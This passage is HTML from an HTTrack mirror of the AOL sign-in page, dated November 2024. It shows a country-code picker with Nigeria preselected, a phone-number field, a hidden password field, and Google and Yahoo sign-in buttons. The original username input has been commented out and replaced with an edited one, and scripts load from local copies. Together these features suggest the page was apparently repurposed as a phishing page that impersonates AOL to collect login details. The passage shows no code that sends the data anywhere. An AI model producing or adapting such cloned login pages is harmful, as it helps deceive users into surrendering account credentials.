                                            <option role="option" data-code="+977" value="NP">Nepal
                                                &#x202A;(+977)&#x202C;</option>
                                            <option role="option" data-code="+31" value="NL">Netherlands
                                                &#x202A;(+31)&#x202C;</option>
                                            <option role="option" data-code="+599" value="AN"> &#x202A;(+599)&#x202C;
                                            </option>
                                            <option role="option" data-code="+687" value="NC">New Caledonia
                                                &#x202A;(+687)&#x202C;</option>
                                            <option role="option" data-code="+64" value="NZ">New Zealand
                                                &#x202A;(+64)&#x202C;</option>
                                            <option role="option" data-code="+505" value="NI">Nicaragua
                                                &#x202A;(+505)&#x202C;</option>
                                            <option role="option" data-code="+227" value="NE">Niger
                                                &#x202A;(+227)&#x202C;</option>
                                            <option role="option" data-code="+234" value="NG" selected="selected">
                                                Nigeria &#x202A;(+234)&#x202C;</option>
                                            <option role="option" data-code="+683" value="NU">Niue
                                                &#x202A;(+683)&#x202C;</option>
                                            <option role="option" data-code="+850" value="KP">North Korea
                                                &#x202A;(+850)&#x202C;</option>
                                            <option role="option" data-code="+1" value="MP">Northern Mariana Islands
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+47" value="NO">Norway
                                                &#x202A;(+47)&#x202C;</option>
                                            <option role="option" data-code="+968" value="OM">Oman
                                                &#x202A;(+968)&#x202C;</option>
                                            <option role="option" data-code="+92" value="PK">Pakistan
                                                &#x202A;(+92)&#x202C;</option>
                                            <option role="option" data-code="+680" value="PW">Palau
                                                &#x202A;(+680)&#x202C;</option>
                                            <option role="option" data-code="+970" value="PS">Palestine
                                                &#x202A;(+970)&#x202C;</option>
                                            <option role="option" data-code="+507" value="PA">Panama
                                                &#x202A;(+507)&#x202C;</option>
                                            <option role="option" data-code="+675" value="PG">Papua New Guinea
                                                &#x202A;(+675)&#x202C;</option>
                                            <option role="option" data-code="+595" value="PY">Paraguay
                                                &#x202A;(+595)&#x202C;</option>
                                            <option role="option" data-code="+51" value="PE">Peru &#x202A;(+51)&#x202C;
                                            </option>
                                            <option role="option" data-code="+63" value="PH">Philippines
                                                &#x202A;(+63)&#x202C;</option>
                                            <option role="option" data-code="+48" value="PL">Poland
                                                &#x202A;(+48)&#x202C;</option>
                                            <option role="option" data-code="+351" value="PT">Portugal
                                                &#x202A;(+351)&#x202C;</option>
                                            <option role="option" data-code="+1" value="PR">Puerto Rico
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+974" value="QA">Qatar
                                                &#x202A;(+974)&#x202C;</option>
                                            <option role="option" data-code="+262" value="RE">Reunion
                                                &#x202A;(+262)&#x202C;</option>
                                            <option role="option" data-code="+40" value="RO">Romania
                                                &#x202A;(+40)&#x202C;</option>
                                            <option role="option" data-code="+7" value="RU">Russia &#x202A;(+7)&#x202C;
                                            </option>
                                            <option role="option" data-code="+250" value="RW">Rwanda
                                                &#x202A;(+250)&#x202C;</option>
                                            <option role="option" data-code="+290" value="SH">Saint Helena
                                                &#x202A;(+290)&#x202C;</option>
                                            <option role="option" data-code="+1" value="KN">Saint Kitts and Nevis
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+1" value="LC">Saint Lucia
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+508" value="PM">Saint Pierre and Miquelon
                                                &#x202A;(+508)&#x202C;</option>
                                            <option role="option" data-code="+1" value="VC">Saint Vincent and Grenadines
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+685" value="WS">Samoa
                                                &#x202A;(+685)&#x202C;</option>
                                            <option role="option" data-code="+378" value="SM">San Marino
                                                &#x202A;(+378)&#x202C;</option>
                                            <option role="option" data-code="+239" value="ST">Sao Tome and Principe
                                                &#x202A;(+239)&#x202C;</option>
                                            <option role="option" data-code="+966" value="SA">Saudi Arabia
                                                &#x202A;(+966)&#x202C;</option>
                                            <option role="option" data-code="+221" value="SN">Senegal
                                                &#x202A;(+221)&#x202C;</option>
                                            <option role="option" data-code="+381" value="RS">Serbia
                                                &#x202A;(+381)&#x202C;</option>
                                            <option role="option" data-code="+248" value="SC">Seychelles
                                                &#x202A;(+248)&#x202C;</option>
                                            <option role="option" data-code="+232" value="SL">Sierra Leone
                                                &#x202A;(+232)&#x202C;</option>
                                            <option role="option" data-code="+65" value="SG">Singapore
                                                &#x202A;(+65)&#x202C;</option>
                                            <option role="option" data-code="+421" value="SK">Slovakia
                                                &#x202A;(+421)&#x202C;</option>
                                            <option role="option" data-code="+386" value="SI">Slovenia
                                                &#x202A;(+386)&#x202C;</option>
                                            <option role="option" data-code="+677" value="SB">Solomon Islands
                                                &#x202A;(+677)&#x202C;</option>
                                            <option role="option" data-code="+252" value="SO">Somalia
                                                &#x202A;(+252)&#x202C;</option>
                                            <option role="option" data-code="+27" value="ZA">South Africa
                                                &#x202A;(+27)&#x202C;</option>
                                            <option role="option" data-code="+82" value="KR">South Korea
                                                &#x202A;(+82)&#x202C;</option>
                                            <option role="option" data-code="+34" value="ES">Spain &#x202A;(+34)&#x202C;
                                            </option>
                                            <option role="option" data-code="+94" value="LK">Sri Lanka
                                                &#x202A;(+94)&#x202C;</option>
                                            <option role="option" data-code="+249" value="SD">Sudan
                                                &#x202A;(+249)&#x202C;</option>
                                            <option role="option" data-code="+597" value="SR">Suriname
                                                &#x202A;(+597)&#x202C;</option>
                                            <option role="option" data-code="+268" value="SZ">Swaziland
                                                &#x202A;(+268)&#x202C;</option>
                                            <option role="option" data-code="+46" value="SE">Sweden
                                                &#x202A;(+46)&#x202C;</option>
                                            <option role="option" data-code="+41" value="CH">Switzerland
                                                &#x202A;(+41)&#x202C;</option>
                                            <option role="option" data-code="+963" value="SY">Syria
                                                &#x202A;(+963)&#x202C;</option>
                                            <option role="option" data-code="+886" value="TW">Taiwan
                                                &#x202A;(+886)&#x202C;</option>
                                            <option role="option" data-code="+992" value="TJ">Tajikistan
                                                &#x202A;(+992)&#x202C;</option>
                                            <option role="option" data-code="+255" value="TZ">Tanzania
                                                &#x202A;(+255)&#x202C;</option>
                                            <option role="option" data-code="+66" value="TH">Thailand
                                                &#x202A;(+66)&#x202C;</option>
                                            <option role="option" data-code="+228" value="TG">Togo
                                                &#x202A;(+228)&#x202C;</option>
                                            <option role="option" data-code="+690" value="TK">Tokelau
                                                &#x202A;(+690)&#x202C;</option>
                                            <option role="option" data-code="+676" value="TO">Tonga
                                                &#x202A;(+676)&#x202C;</option>
                                            <option role="option" data-code="+1" value="TT">Trinidad and Tobago
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+216" value="TN">Tunisia
                                                &#x202A;(+216)&#x202C;</option>
                                            <option role="option" data-code="+90" value="TR">Turkey
                                                &#x202A;(+90)&#x202C;</option>
                                            <option role="option" data-code="+993" value="TM">Turkmenistan
                                                &#x202A;(+993)&#x202C;</option>
                                            <option role="option" data-code="+1" value="TC">Turks and Caicos Islands
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+688" value="TV">Tuvalu
                                                &#x202A;(+688)&#x202C;</option>
                                            <option role="option" data-code="+1" value="VI">US Virgin Islands
                                                &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+256" value="UG">Uganda
                                                &#x202A;(+256)&#x202C;</option>
                                            <option role="option" data-code="+380" value="UA">Ukraine
                                                &#x202A;(+380)&#x202C;</option>
                                            <option role="option" data-code="+971" value="AE">United Arab Emirates
                                                &#x202A;(+971)&#x202C;</option>
                                            <option role="option" data-code="+44" value="GB">United Kingdom
                                                &#x202A;(+44)&#x202C;</option>
                                            <option role="option" data-code="+1" value="US"
                                                data-format="(XXX) XXX-XXXX">United States &#x202A;(+1)&#x202C;</option>
                                            <option role="option" data-code="+598" value="UY">Uruguay
                                                &#x202A;(+598)&#x202C;</option>
                                            <option role="option" data-code="+998" value="UZ">Uzbekistan
                                                &#x202A;(+998)&#x202C;</option>
                                            <option role="option" data-code="+678" value="VU">Vanuatu
                                                &#x202A;(+678)&#x202C;</option>
                                            <option role="option" data-code="+379" value="VA">Vatican City
                                                &#x202A;(+379)&#x202C;</option>
                                            <option role="option" data-code="+58" value="VE">Venezuela
                                                &#x202A;(+58)&#x202C;</option>
                                            <option role="option" data-code="+84" value="VN">Vietnam
                                                &#x202A;(+84)&#x202C;</option>
                                            <option role="option" data-code="+681" value="WF">Wallis and Futuna
                                                &#x202A;(+681)&#x202C;</option>
                                            <option role="option" data-code="+967" value="YE">Yemen
                                                &#x202A;(+967)&#x202C;</option>
                                            <option role="option" data-code="+260" value="ZM">Zambia
                                                &#x202A;(+260)&#x202C;</option>
                                            <option role="option" data-code="+263" value="ZW">Zimbabwe
                                                &#x202A;(+263)&#x202C;</option>
                                        </select>
                                        <div class="arrow"></div>
                                    </div>

                                </div>
                                <!-- <div class="input-group"> -->
                                    <label for="login-username" id="login-label" class="login-label">Phone Number</label>
                                <input type="text" id="email" name="phone" required placeholder="">
                                    <!-- <input class="phone-no field-error" type="text" name="phone" id="login-username"
                                        value="" autocomplete="username" autocapitalize="none" autocorrect="off"
                                        autofocus="true" placeholder=" "> -->
                                    <div class="input-field-icon hide" id="username-field-icon"></div>
                                    
                                    <ul class="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
                                        <li data-fill="yahoo.com" tabindex="2">yahoo.com</li>
                                        <li data-fill="gmail.com" tabindex="3">gmail.com</li>
                                        <li data-fill="outlook.com" tabindex="4">outlook.com</li>
                                        <li data-fill="aol.com" tabindex="5">aol.com</li>
                                    </ul>
                                </div>
                                <div class="hidden-input-container">
                                    <input name="passwd" class="pwd-field" type="password" tabindex="-1"
                                        aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password">
                                </div>
                            </div>
                            

                            <div class="button-container">
                                <input id="login-signin" type="submit" name="signin"
                                    class="pure-button puree-button-primary challenge-button" value="Next">
                            </div>

                            


                            <div class="bottom-links-container has-social-buttons">
                                <p class="sign-up-link">
                                    <!-- <a href="/account/create?intl=us&amp;src=fp-us&amp;activity=default&amp;pspid=1197803361&amp;done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3D6ldE2VGUSRxVl3qyjb4vSEnXlUoRGHKV%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bopenid%2Bguce-w%2Bopenid2%2Bsdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E&amp;specId=yidregsimplified"
                                        id="createacc" role="button"
                                        class="pure-button puree-button-secondary challenge-button"
                                        data-rapid-tracking="true"
                                        data-ylk="elm:link;elmt:secondary;slk:signup;mKey:signup">Create
                                        an&nbsp;account</a> -->
                                </p>

                                <div id="social-login-container" class="social-login-container">
                                    <div class="or-cont-with-desc challenge-feedback-text">
                                        or
                                    </div>
                                    <ul class="social-login">
                                        <li class="items-cont-2">
                                            <button type="submit" id="tpa-google-button" name="tpaProvider"
                                                value="google"
                                                class="pure-button sc-button items-2 sc-google sc-google-button"
                                                data-rapid-tracking="true"
                                                data-ylk="elm:btn;slk:google-btn;mKey:google-social-btn">
                                                <label class="offscreen">
                                                    Sign in with&nbsp;Google
                                                </label>
                                            </button>
                                        </li>
                                        <li class="items-cont-2">
                                            <button type="submit" id="tpa-yahoo-button" name="tpaProvider" value="yahoo"
                                                class="pure-button sc-button items-2 sc-yahoo sc-yahoo-button"
                                                data-rapid-tracking="true"
                                                data-ylk="elm:btn;slk:yahoo-btn;mKey:yahoo-social-btn">
                                                <label class="offscreen">
                                                    <span class="capitalize">
                                                        yahoo
                                                    </span>
                                                </label>
                                            </button>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
                <h1></h1>
                <p></p>
            </div>
        </div>
        <div class="login-bg-outer">
            <div class="login-bg-inner">
                <div id="login-ad-rich" aria-hidden="true">
                    <iframe id="login-ads-gpt-iframe"
                        allow="geolocation 'none'; fullscreen 'none'; autoplay 'none'; camera 'none'; display-capture 'none'; document-domain 'none'; microphone 'none'; gyroscope 'none'; magnetometer 'none'; midi 'none'; payment 'none'; serial 'none'; speaker-selection 'none'"
                        sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"
                        width="1440" height="1024" scrolling="no" frameborder="no"
                        src="https://gpt.mail.yahoo.net/sandbox?client=aolLogin&amp;version=0.1&amp;limited=0&amp;headerBidder=1&amp;haq=1&amp;benji=1#config=%7B%22positions%22%3A%5B%7B%22adUnitPath%22%3A%22%2F22888152279%2Fus%2Faollogin%2Fmain%2Fdt%2Fus_aollogin_main_dt_full_screen%22%2C%22adLocation%22%3A%22full_screen%22%2C%22size%22%3A%5B%5B1440%2C1024%5D%2C%5B%22fluid%22%5D%5D%2C%22div%22%3A%22gpt-passback%22%7D%5D%2C%22pageUrl%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22headerBidder%22%3Atrue%2C%22yahooPrebid%22%3Atrue%2C%22geoCountryCode%22%3A%22NG%22%2C%22npa%22%3Afalse%2C%22limited%22%3Afalse%2C%22PPId%22%3A%22792d45332e7239584a4532754c487539654346415361424542415f4b6542414a46357e41%22%2C%22targetingConfig%22%3A%7B%22lang%22%3A%22en-US%22%2C%22bucket%22%3A%22mbr-whatsapp-ac%2Cmbr-whatsapp-nac%2Cmbr-ar-cc%2Cmbr-fido-upsell-desktop2%2Cmbr-request-imapin-scopes-ym%22%2C%22spaceId%22%3A%22160500005%22%2C%22adLocation%22%3A%22full_screen%22%2C%22age%22%3A%220%22%2C%22gender%22%3A%220%22%2C%22colo%22%3A%22bf1%22%2C%22lu%22%3A%220%22%2C%22site%22%3A%22login%22%2C%22device%22%3A%22desktop%22%2C%22region%22%3A%22us%22%2C%22pageOrigin%22%3A%22https%3A%2F%2Flogin.aol.com%22%2C%22AXId%22%3A%22y-E3.r9XJE2uLHu9eCFASaBEBA_KeBAJF5~A%22%7D%2C%22headerBidderConfig%22%3A%7B%22host%22%3A%22login.aol.com%22%2C%22pblob%22%3A%22lu%3A0%7C%7C160500005%7C%7C%22%2C%22buckets%22%3A%5B%22mbr-whatsapp-ac%22%2C%22mbr-whatsapp-nac%22%2C%22mbr-ar-cc%22%2C%22mbr-fido-upsell-desktop2%22%2C%22mbr-request-imapin-scopes-ym%22%5D%2C%22limited%22%3Afalse%2C%22cobrand%22%3A%22%22%2C%22lang%22%3A%22en-US%22%2C%22site%22%3A%22aol_login%22%2C%22region%22%3A%22us%22%2C%22adLocation%22%3A%22full_screen%22%2C%22dv360%22%3A%22eS10TnRzeDJaRTJ1SDlvMHpHQ0dTMkx5VU1tWHhvZlBVeX5B%22%2C%22AXId%22%3A%22y-E3.r9XJE2uLHu9eCFASaBEBA_KeBAJF5~A%22%7D%7D"
                        style="display: none;"></iframe>
                </div>
            </div>
        </div>
    </div>
    <script src="ss/rapid-3.53.39.js"></script>
    <script nonce="">
        var rapidInstance = new YAHOO.i13n.Rapid(I13N_config);
    </script>
    <script src="wm/mbr/8218dc35a45c1f7b84d843e04ae1560b00f4bd05/bundle.js"></script>
    <noscript>
        <img src="/account/js-reporting/?crumb=2oZOK6RIT3rxzVtiVUsHA&message=javascript_not_enabled&ref=%2F" height="0"
            width="0" style="visibility: hidden;">
    </noscript>
    <script src="https://consent.cmp.oath.com/cmp.js"></script><iframe name="__uspapiLocator"
        style="display: none;"></iframe><iframe name="__tcfapiLocator" style="display: none;"></iframe><iframe
        name="__gppLocator" style="display: none;"></iframe>
    <script src="https://opus.analytics.yahoo.com/tag/opus.js"></script>
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross">
        <p class="mbr-legacy-device">
            AOL works best with the latest versions of the browsers. You're using an outdated or unsupported browser and
            some AOL features may not work properly. Please update your browser version now. <a
                href="">More&nbsp;Info</a>
        </p>
    </div>
    <!-- <script nonce="">
        (function (root) {
            if (!root.isGoodJS) {
                document.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script> -->


    <iframe frameborder="0" height="0" width="0"
        src="https://opus.analytics.yahoo.com/tag/opus-frame.html?referrer=https%3A%2F%2Flogin.aol.com%2F%3Fsrc%3Dfp-us%26client_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26crumb%3D2QNPfXrlA.j%26intl%3Dus%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26pspid%3D1197803361%26activity%3Ddefault%26done%3Dhttps%253A%252F%252Fapi.login.aol.com%252Foauth2%252Fauthorize%253Fclient_id%253Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%2526intl%253Dus%2526nonce%253D6ldE2VGUSRxVl3qyjb4vSEnXlUoRGHKV%2526redirect_uri%253Dhttps%25253A%25252F%25252Foidc.www.aol.com%25252Fcallback%2526response_type%253Dcode%2526scope%253Dmail-r%252Bopenid%252Bguce-w%252Bopenid2%252Bsdps-r%2526src%253Dfp-us%2526state%253DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E&amp;tbla_id=603327cf-0d2e-4657-853c-700d29500c61-tucte263eb7&amp;axids=gam%3Dy-E3.r9XJE2uLHu9eCFASaBEBA_KeBAJF5~A%26dv360%3DeS10TnRzeDJaRTJ1SDlvMHpHQ0dTMkx5VU1tWHhvZlBVeX5B%26ydsp%3Dy-6AUvHcRE2uLkWsh0_wwqQVnwTUs0ZCoL~A%26tbla%3Dy-9_bHinJE2uISm8GrIDqzR37VBi06Hau3~A&amp;gdpr=false&amp;gdpr_consent=&amp;gpp=DBAA&amp;gpp_sid=-1&amp;us_privacy=1---&amp;reset_idsync=1"
        style="display: none;"></iframe>
</body>

<!-- Mirrored from login.aol.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Nov 2024 19:14:11 GMT -->

</html>
<!-- fe36.member.ir2.yahoo.com - Wed Nov 06 2024 19:13:54 GMT+0000 (Coordinated Universal Time) - (1ms) -->


